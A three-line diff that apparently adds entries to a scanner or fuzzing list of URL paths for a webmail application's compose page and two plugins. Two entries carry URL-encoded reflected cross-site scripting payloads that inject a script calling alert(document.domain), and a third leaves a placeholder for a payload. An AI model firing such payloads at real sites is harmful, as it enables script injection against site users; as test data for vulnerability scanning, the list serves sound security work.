@@ -1,0 +1,3 @@
+/mail/src/compose.php?mailbox=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/plugins/vkeyboard/vkeyboard.php?passformname={{url_encode(payload)}}
